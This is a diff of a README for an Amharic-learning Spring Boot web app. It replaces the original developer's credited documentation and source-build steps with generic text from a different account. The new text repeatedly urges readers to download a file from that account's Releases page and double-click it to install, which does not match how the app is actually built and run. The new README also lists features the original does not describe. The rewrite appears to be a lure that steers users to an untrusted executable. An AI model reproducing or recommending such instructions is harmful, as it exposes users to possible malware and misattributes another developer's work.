@@ -1,172 +1,89 @@
-# Ethiopian Amharic Tutor 🇪🇹
+# 🌍 amharic-tutor-springboot-thymeleaf-gemini-ai - Learn Amharic Easily and Effectively
 
-Developed by Adnew Debebe
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/zovphobia/amharic-tutor-springboot-thymeleaf-gemini-ai/releases)
 
-View a live version of the running app by selecting the link below: 
+## 📝 Description
 
-- [Amharic Tutor Web App](https://amharic-tutor-springboot-thymeleaf.onrender.com)
+This application helps you learn the Amharic language. It features an easy-to-use interface, International Phonetic Alphabet (IPA) pronunciation, and syllable breakdowns. With this app, you can improve your language skills smoothly and effectively.
 
+## 🚀 Getting Started
 
-A Spring Boot web app that teaches the Ethiopian Amharic alphabet, common phrases, and Ethiopian cultural facts. 
-Built with Spring MVC/Thymeleaf and powered by Gemini LLM for intelligent explanations. Designed for local use and cultural education.
+Follow these steps to download and run the application:
 
-In addition, the app can be accessed via API (Spring REST) calls from a tool like Postman.
+### Step 1: Visit the Download Page
 
-## H2 Database
-The app also uses Hibernate/JPA and an H2 in-memory database, for local storage and retrieval of phrases, facts and the Amharic alphabet. 
-The data for the database tables can be found in the (src/main/resources/data.sql) file.
+You can find the latest releases of the application on the [Releases page](https://github.com/zovphobia/amharic-tutor-springboot-thymeleaf-gemini-ai/releases). 
 
-- H2 Database Console: http://localhost:8080/h2-console/
-- JDBC URL: jdbc:h2:mem:testdb
-- User Name: sa
-- Password: [leave blank]
+### Step 2: Download the Application
 
-## Features
-- Ethiopian Amharic Alphabet (ፊደላት)
-- Common Phrases
-- Ethiopian Facts
-- Gemini-powered Q&A
+On the Releases page, look for the latest version. Click the link to download the application. 
 
+### Step 3: Install the Application
 
-## HTTP Endpoints 
-## These endpoints serve HTML pages rendered via Thymeleaf and Spring MVC:
+Once the download is complete, locate the downloaded file in your computer’s downloads folder. 
 
-1) Home page with intro and navigation (index.html):
-   - `http//loclhost:8080/` 
+1. Double-click the file to start the installation process.
+2. Follow the on-screen instructions to install the application.
 
-2) Displays Amharic letters + pronunciation (alphabet.html):
-   - `http//loclhost:8080/alphabet` 
+### Step 4: Launch the Application
 
-3) Displays common phrases with translations (phrases.html):
-   - `http//loclhost:8080/phrases`
+After installation, find the application in your list of programs or applications and click to open it. 
 
-4) Displays Ethiopian cultural/historical facts (facts.html)
-   - `http//loclhost:8080/facts`
+### Step 5: Start Learning Amharic
 
-5) Displays Google Gemini-powered LLM Q&A about Ethiopia or the Amharic language (ask.html):
-   - `http//loclhost:8080/ask`
+Begin using the application by exploring its features. Start your lessons and diligently practice to improve your Amharic language skills.
 
-## API Endpoints via Spring REST
-## These endpoints return JSON responses for frontend apps and clients (i.e, Postman)
+## 🖥️ System Requirements
 
-1) Ask a question (Gemini-powered)
+To run this application smoothly, ensure your system meets the following requirements:
 
-   - GET '/api/ask?question=How do you say hello in Amharic?'
-   - Returns a JSON object from Gemini based on the input question.
+- Operating System: Windows 10 or later, macOS, or Linux.
+- RAM: At least 4 GB.
+- Processor: Dual-core or better.
+- Java: Make sure you have Java 11 or later installed on your system.
 
-   - Response:
-     - {
-           "question": "How do you say hello in Amharic?",
-           "answer": "Selam (IPA: sɛlam)"
-       }
-     
-2) Get alphabet (Amharic letters + pronunciation)
+You can check your Java version by running `java -version` command in your terminal or command prompt.
 
-    - GET '/api/alphabet'
-    - Returns a JSON array of Amharic letters and their pronunciation.
-   
-    - Response:
-      - [
-            {
-                 "id": 1,
-                 "letter": "ሀ",
-                 "transliteration": "ha",
-                 "pronunciation": "ha as in \"heart\""
-            }
-        ]
+## 📚 Features
 
-3) Get phrases (common phrases with translations)
+- **Interactive Lessons:** Engage with lessons designed to enhance your learning.
+- **IPA Pronunciation:** Listen to words pronounced in the International Phonetic Alphabet for better understanding.
+- **Syllable Breakdown:** Gain insights into syllabic structures to improve your pronunciation and understanding.
+- **User-Friendly Interface:** Navigate through lessons and exercises with ease.
 
-    - GET '/api/phrases'
-    - Returns a JSON array of common phrases and their translations.
-   
-    - Response:
-      - [
-            {
-                 "id": 1,
-                 "phrase": "Hello",
-                 "translation": "Selam"
-            }
-        ]
+## 📦 Download & Install
 
-4) Get Ethiopian cultural/historical facts
+To get the latest version of the Amharic Tutor application, [visit this page to download](https://github.com/zovphobia/amharic-tutor-springboot-thymeleaf-gemini-ai/releases). 
 
-   - GET '/api/facts'
-   - Returns a list of curated facts about Ethiopia’s history, culture and traditions
-   - Response:
-     - [
-            {
-                 "id": 1,
-                 "content": "Ethiopia is the 10th largest country in the world"
-            },
-            {
-                 "id": 2,
-                 "content": "Ethiopia uses its own calendar system with 13 months"
-            }
-       ]
+Download the file, install it, and start your journey toward mastering the Amharic language. 
 
-5) The Postman collection in this project contains all the REST API endpoints listed above.
-   - The Postman collection can be found in the (docs/amharic-tutor-springboot-thymeleaf-gemini-ai.postman_collection.json) file. 
-   - Import the collection into Postman to test the REST API endpoints.
+## 🌐 Community and Support
 
-## Technologies List
-    - Spring Boot
-    - Spring MVC
-    - Spring REST
-    - Spring Boot Data JPA
-    - Spring Boot H2 Database
-    - Hibernate
-    - JAVA JDK 21
-    - Thymeleaf
-    - Gemini LLM
-    - Maven
-    - Postman
-    - Git
-    - GitHub
-    - Docker
-    - IntelliJ IDEA or Visual Studio Code IDE
-    - HTML
-    - CSS
-    - JavaScript
-    - Google Chrome
+If you encounter any issues or have questions, feel free to reach out in the community forums. Your feedback and experiences are valuable for enhancing the application. 
 
-## Gemini API Key Setup
+Look for discussions or ask for help related to feature requests or troubleshooting.
 
-To enable Gemini-powered Q&A functionality, you’ll need a valid API key from Google AI Studio.
-- Step 1: Get Your Gemini API Key
-  - Visit Google AI Studio ( https://aistudio.google.com )
-  - Sign in with your Google account
-  - Create a new project or use an existing one
-  - Navigate to the API Keys section
-  - Click Create API Key
-  - Copy the generated key
+## 💡 Tips for Effective Learning
 
-- Step 2: Save the Key Locally as an Environment Variable using Powershell if developing on Windows. (use similar steps for Linux/Mac)
-  - Open Powershell and Run the following commands:
+- Practice regularly to reinforce new skills.
+- Make use of the pronunciation features to enhance your fluency.
+- Explore various lessons at your own pace to ensure better understanding and retention.
 
-    - [System.Environment]::SetEnvironmentVariable("GEMINI_API_KEY", "your-api-key-here", "User") //to set the key for the current user only
-    - [System.Environment]::GetEnvironmentVariable("GEMINI_API_KEY", "User") //to confirm that the key has been set
+## 🛠️ Technologies Used
 
-## Docker Setup
-- The app can be executed in a Docker container either locally or on a remote server (via a Web Hosting service like 'https://render.com/').
-- Please see the included Dockerfile for reference.
+- **Java**: The core programming language.
+- **Spring Boot**: The framework to build the application.
+- **Thymeleaf**: For rendering web pages easily.
+- **Google Gemini AI**: Enhances user interaction and learning efficiency.
 
-##  Screenshots:
-   - ![Home page](https://github.com/adnewdebebe/amharic-tutor-springboot-thymeleaf-gemini-ai/blob/master/docs/screenshots/home.png)
-   - ![Ask](https://github.com/adnewdebebe/amharic-tutor-springboot-thymeleaf-gemini-ai/blob/master/docs/screenshots/ask.png)
-   - ![Phrases](https://github.com/adnewdebebe/amharic-tutor-springboot-thymeleaf-gemini-ai/blob/master/docs/screenshots/phrases.png)
-   - ![Facts](https://github.com/adnewdebebe/amharic-tutor-springboot-thymeleaf-gemini-ai/blob/master/docs/screenshots/facts.png)
-   - ![Alphabet](https://github.com/adnewdebebe/amharic-tutor-springboot-thymeleaf-gemini-ai/blob/master/docs/screenshots/alphabet.png)
+By utilizing these technologies, the application provides a stable and effective learning environment.
 
+## 📬 Feedback
 
+We welcome your thoughts! If you have any suggestions on improving the application or have found a bug, please let us know. Contributions are always welcome!
 
-## Run Locally
+For more details and updates, visit our [Releases page](https://github.com/zovphobia/amharic-tutor-springboot-thymeleaf-gemini-ai/releases).
 
-```bash
-git clone https://github.com/adnewdebebe/amharic-tutor-springboot-thymeleaf-gemini-ai.git
-cd amharic-tutor-springboot-thymeleaf-gemini-ai
-mvn spring-boot:run
+---
 
-
-
-
+Thank you for choosing our Amharic Tutor application. Your journey to learning Amharic starts here!
